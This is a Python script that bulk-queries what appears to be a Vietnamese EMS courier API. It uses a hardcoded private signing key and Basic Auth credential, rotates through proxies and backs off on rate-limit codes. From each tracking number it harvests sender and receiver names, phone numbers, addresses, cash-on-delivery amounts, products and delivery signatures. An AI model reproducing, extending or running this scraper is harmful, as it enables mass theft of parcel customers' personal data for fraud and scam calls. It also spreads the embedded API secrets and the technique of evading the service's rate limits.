#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""高速批量查询 - 最终完整版"""
import hashlib, requests, json, time, random, os, re
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

API_URL = "https://api-dingdong.ems.com.vn/"
PRIVATE_KEY = "34784DCEAD1484AA758A8C033FB0F858BDACABC7BE8FC2F5CC5AFD376AB8654A"
BASIC_AUTH = "bG90dG5ldDpkbXM="

proxies, print_lock = [], threading.Lock()

def load_proxies():
    global proxies
    try:
        with open("proxy_list.txt", 'r', encoding='utf-8') as f:
            for line in f:
                if line.strip() and not line.startswith('#'):
                    parts = line.strip().split(':')
                    if len(parts) == 4:
                        ip, port, user, pwd = parts
                        proxies.append({'http': f'http://{user}:{pwd}@{ip}:{port}', 'https': f'http://{user}:{pwd}@{ip}:{port}'})
        print(f"✅ 加载 {len(proxies)} 个代理\n")
    except:
        print("⚠️  无代理\n")

def sign(text):
    return hashlib.sha256((text + PRIVATE_KEY).encode()).hexdigest().upper()

def safe_print(msg):
    with print_lock:
        print(msg)

def extract_phone(text):
    if not text:
        return None
    phones = re.findall(r'0\d{8,10}', str(text))
    return phones[0] if phones else None

def query_fast(tracking):
    sig = sign(tracking)
    headers_form = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/x-www-form-urlencoded"}
    headers_json = {"Authorization": f"Basic {BASIC_AUTH}", "APIKey": PRIVATE_KEY, "Content-Type": "application/json"}
    
    result = {"tracking": tracking, "valid": False, "delivered": False, "inquiry_code": "?", "gateway_code": "?",
              "sender_name": "", "sender_phone": "", "receiver": "", "receiver_address": "", "phone": "",
              "amount": 0, "weight": "", "fee_ship": 0, "product": "", "delivery_date": "", "signature": "", "issue_date": ""}
    
    try:
        proxy = random.choice(proxies) if proxies else None
        
        # Inquiry
        r = requests.post(f"{API_URL}api/Delivery/Inquiry", headers=headers_form, data={"ParcelCode": tracking, "Signature": sig}, proxies=proxy, timeout=8)
        if r.status_code == 200:
            data = r.json()
            result['inquiry_code'] = data.get('Code', '?')  # 记录code
            
            if result['inquiry_code'] == "98" or result['inquiry_code'] == "429":
                time.sleep(0.5)
                return result
            
            if data.get('Value'):
                v = data['Value']
                result['valid'] = True
                result.update({'sender_name': v.get('SenderName',''), 'sender_phone': v.get('SenderPhone',''), 'receiver': v.get('ReceiverName',''),
                              'receiver_address': v.get('ReceiverAddress',''), 'phone': v.get('ReceiverPhone',''), 'amount': v.get('CollectAmount',0),
                              'weight': v.get('Weigh',''), 'fee_ship': v.get('FeeShip',0), 'issue_date': v.get('IssueDate','')})
                
                # 智能提取电话
                if not result['phone']:
                    result['phone'] = extract_phone(result['receiver']) or extract_phone(result['receiver_address']) or ""
        
        # Journey
        r = requests.post(f"{API_URL}api/Delivery/DeliveryLadingJourney", headers=headers_form, data={"ParcelCode": tracking}, proxies=proxy, timeout=8)
        if r.status_code == 200 and r.json().get('ListValue'):
            rec = r.json()['ListValue'][0]
            result['delivered'], result['delivery_date'], result['signature'] = True, rec.get('DeliveryDate',''), rec.get('DeliverySignature','')
        
        # Gateway
        r = requests.post(f"{API_URL}api/Gateway/Bussiness", headers=headers_json, json={"Code": "LDP002", "Data": tracking}, proxies=proxy, timeout=8)
        if r.status_code == 200:
            data = r.json()
            result['gateway_code'] = data.get('Code', '?')  # 记录code
            if data.get('Data'):
                products = json.loads(data['Data'])
                if products:
                    result['product'] = products[0].get('ProductName','')
    except:
        pass
    
    return result

def batch_query_fast():
    print("""
╔════════════════════════════════════════════════════════════════════════════╗
║                    ⚡ 高速批量查询 - 完整验证版 ⚡                         ║
╚════════════════════════════════════════════════════════════════════════════╝
    """)
    
    load_proxies()
    
    with open("key.txt", 'r', encoding='utf-8') as f:
        trackings = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    
    print(f"📋 运单数: {len(trackings)}\n开始查询...\n")
    
    results, start_time = [], time.time()
    
    with ThreadPoolExecutor(max_workers=7) as executor:
        futures = {executor.submit(query_fast, t): t for t in trackings}
        
        for future in as_completed(futures):
            try:
                result = futures[future]
                results.append(future.result())
                
                r = future.result()
                status = "✅" if r['valid'] else "❌"
                delivered = "已配" if r['delivered'] else "未配"
                
                info = []
                if r['valid']:
                    if r['receiver']:
                        info.append(f"👤{r['receiver'][:15]}")
                    info.append(f"📞{r['phone'] or r['sender_phone']+'(发)' if r['sender_phone'] else '无'}")
                    if r['amount'] > 0:
                        info.append(f"💰{r['amount']:,}₫")
                    if r['product'] and r['product'] != "***":
                        info.append(f"📦{r['product'][:20]}")
                
                safe_print(f"[{len(results)}/{len(trackings)}] {status} {delivered} {r['tracking']} I:{r['inquiry_code']} G:{r['gateway_code']} | {' | '.join(info) if info else '无数据'}")
            except:
                safe_print(f"[{len(results)}/{len(trackings)}] ❌ 错误")
    
    print(f"\n✅ 完成！有效: {sum(1 for r in results if r['valid'])}/{len(trackings)}")

if __name__ == "__main__":
    batch_query_fast()
